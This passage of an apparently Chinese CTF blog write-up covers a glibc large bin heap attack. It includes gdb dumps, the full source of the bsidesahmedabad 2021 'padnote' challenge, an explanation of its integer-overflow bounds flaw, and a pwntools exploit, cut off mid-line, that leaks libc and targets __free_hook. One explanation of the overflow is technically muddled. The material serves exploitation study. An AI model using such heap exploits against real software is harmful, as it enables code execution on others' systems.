0x7f0c129bbfd0 (main_arena+1104) ◂— 0x55f31dd5e5e0</span><br></pre></td></tr></table></figure><p>然后释放p2:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Free the smaller of the two --&gt; [p2] (%p)\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line">p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);<span class="comment">//修改p1 bk_nextsize 为target+0x20</span></span><br></pre></td></tr></table></figure><p>此时p2为unsortedbin：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x55f31dd5ea30 —▸ 0x7f0c129bbbe0 (main_arena+96) ◂— 0x55f31dd5ea30</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400: 0x55f31dd5e5e0 —▸ 0x7f0c129bbfd0 (main_arena+1104) ◂— 0x55f31dd5e5e0</span><br></pre></td></tr></table></figure><p>此时P1的内存分布为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;36gx 0x55f31dd5e5e0</span><br><span class="line">0x55f31dd5e5e0: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x55f31dd5e5f0: 0x00007f0c129bbfd0      0x00007f0c129bbfd0</span><br><span class="line">0x55f31dd5e600: 0x000055f31dd5e5e0      0x00007f0c129bee30 （target+0x20)</span><br><span class="line">0x55f31dd5e610: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f31dd5e620: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f31dd5e630: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>然后我们再让p2进入larger bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n"</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br></pre></td></tr></table></figure><p>这时，由于p1&gt;p2,我们的攻击将进行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"><span class="comment">//victim在例子中p2</span></span><br><span class="line"><span class="comment">//victim-&gt;bk_nextsize-&gt;fd_nextsize 为我们修改的p1-&gt;bk_nextsize的值</span></span><br><span class="line"><span class="comment">//fwd-&gt;fd-&gt;bk_nextsize为p1-&gt;bk_nextsize</span></span><br></pre></td></tr></table></figure><p>,在target处写入p2地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7f0c129bee30:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f0c129bee40:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f0c129bee50:   0x000055f31dd5ea30      0x0000000000000000</span><br><span class="line">0x7f0c129bee60:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f0c129bee70:   0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="例题-bsidesahmedabad-2021-padnote"><a href="#例题-bsidesahmedabad-2021-padnote" class="headerlink" title="例题_bsidesahmedabad_2021_padnote"></a>例题_bsidesahmedabad_2021_padnote</h2><p>题目环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>题目源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHECK_FAIL(ERR) &#123;                       \</span></span><br><span class="line">    <span class="built_in">puts</span>(ERR);                                  \</span><br><span class="line">    <span class="keyword">return</span>;                                     \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_NOTE 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line">  <span class="keyword">char</span> *content;</span><br><span class="line">&#125; Note;</span><br><span class="line"></span><br><span class="line">Note noteList[MAX_NOTE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ReadLine</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> <span class="built_in">size</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> c;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i != <span class="built_in">size</span> - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">read</span>(<span class="number">0</span>, &amp;c, <span class="keyword">sizeof</span>(c)) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>); <span class="comment">// IO error</span></span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">'\n'</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      buf[i] = c;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateNote</span><span class="params">(Note *note)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line">  <span class="keyword">char</span> *content;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Note is in use"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input data length */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;<span class="built_in">size</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Security check */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">size</span> &lt;= <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Size must be larger than 0"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize note */</span></span><br><span class="line">  <span class="keyword">if</span> (!(content = (<span class="keyword">char</span>*)<span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="built_in">size</span>)))</span><br><span class="line">    CHECK_FAIL(<span class="string">"Could not allocate the memory"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input content */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">  ReadLine(content, <span class="built_in">size</span>);</span><br><span class="line"></span><br><span class="line">  note-&gt;content = content;</span><br><span class="line">  note-&gt;<span class="built_in">size</span> = <span class="built_in">size</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EditNote</span><span class="params">(Note *note)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> offset, count, epos;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (!note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Note is empty"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input offset */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Offset: "</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;offset) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input count */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Count: "</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;count) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Security check */</span></span><br><span class="line">  <span class="keyword">if</span> (offset &lt; <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Invalid offset"</span>);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Invalid count"</span>);</span><br><span class="line">  <span class="keyword">if</span> ((epos = offset + count) &lt; <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Integer overflow"</span>);</span><br><span class="line">  <span class="keyword">if</span> (epos &gt; note-&gt;<span class="built_in">size</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Out-of-bound access"</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Edit content */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">  ReadLine(&amp;note-&gt;content[offset], count);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintNote</span><span class="params">(Note *note)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (!note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Note is empty"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Print note */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">write</span>(<span class="number">1</span>, note-&gt;content, note-&gt;<span class="built_in">size</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteNote</span><span class="params">(Note *note)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (!note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Note is empty"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Delete note */</span></span><br><span class="line">  <span class="built_in">free</span>(note-&gt;content);</span><br><span class="line">  note-&gt;<span class="built_in">size</span> = <span class="number">0</span>;</span><br><span class="line">  note-&gt;content = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1. CreateNote"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2. EditNote"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3. PrintNote"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4. DeleteNote"</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> choice, index;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Input choice */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Choice: "</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;choice) &lt;= <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (choice &lt; <span class="number">1</span> || choice &gt; <span class="number">4</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Bye!"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Input index */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;index) &lt;= <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Security check */</span></span><br><span class="line">    <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= MAX_NOTE) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid index"</span>);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: CreateNote(&amp;noteList[index]); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: EditNote(&amp;noteList[index]); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: PrintNote(&amp;noteList[index]); <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: DeleteNote(&amp;noteList[index]); <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目主要漏洞在它的edit功能的安全检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Security check */</span></span><br><span class="line"><span class="keyword">if</span> (offset &lt; <span class="number">0</span>)</span><br><span class="line">  CHECK_FAIL(<span class="string">"Invalid offset"</span>);</span><br><span class="line"><span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">  CHECK_FAIL(<span class="string">"Invalid count"</span>);</span><br><span class="line"><span class="keyword">if</span> ((epos = offset + count) &lt; <span class="number">0</span>)</span><br><span class="line">  CHECK_FAIL(<span class="string">"Integer overflow"</span>);</span><br><span class="line"><span class="keyword">if</span> (epos &gt; note-&gt;<span class="built_in">size</span>)</span><br><span class="line">  CHECK_FAIL(<span class="string">"Out-of-bound access"</span>);</span><br></pre></td></tr></table></figure><p>题目在<code>offset + count</code>进行检查时，忘了在int64 中<code>0x8000000==0</code>的情况。</p><p>导致我们可以任意写，然后通过 <code>PrintNote</code>泄露出基地址。</p><p>但是，由于calloc函数，导致我们不能用tache bin 来attack。</p><p>但是由于题目没有限制chunk大小，导致我们可以利用Large bin Attack 写入<em>`</em>free_hook+0x20<code>处再创造chunk覆盖</code>__free_hook`为system。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/11/07 21:47:24</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./chall'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'pwn.bsidesahmedabad.in'</span>,<span class="number">9003</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,offset,count,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'Offset:'</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line">    p.recvuntil(<span class="string">'Count:'</span>)</span><br><span class="line">    p.sendline(str(count))</span><br><span class="line">    p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>,<span class="string">'x'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x278</span>,<span class="string">'x'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x278</span>,<span class="string">'x'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x548</span>,<span class="string">'x'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">2</span>,<span class="number">2147483647</span><span class="number">-1</span>,<span class="string">'8'</span>*<span class="number">0x46</span>+p64(<span class="number">0x501</span>)+<span class="string">'8'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x2d8</span>,<span class="string">'x'</span>*<span class="number">0x270</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x281</span>))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span></span><br><span class="line">log.info(hex(addr))</span><br><span class="line">malloc_hook=addr<span class="number">-0x10</span></span><br><span class="line">x=finder(<span class="string">'__malloc_hook'</span>,malloc_hook,num=<span class="number">6</span>)</span><br><span class="line">free_hook=x.dump(<span class="string">'__free_hook'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">'0'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>,<span class="string">'1'</span>*<span class="number">8</span>) <span class="comment">#p1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">'2'</span>*<span class="number">8</span>)<span class="comment">#g1</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>,<span class="string">'3'</span>*<span class="number">8</span>)<span class="comment">#p2</span></span><br><span class="line"><span class="comment"># put a chunk to unsorted bin</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># put a chunk to large bin</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x438</span>,<span class="string">'1'</span>*<span class="number">4</span>)</span><br><span class="line"><span class="comment"># put a chunk to unsorted bi</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#modify bk-&gt;next of chunk p1</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x38</span>, (<span class="number">0x7fffffff</span><span class="number">-0x38</span>+<span class="number">1</span>), p64(free_hook<span class="number">-0x4b</span><span class="number">-2</span>) )</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>,<span 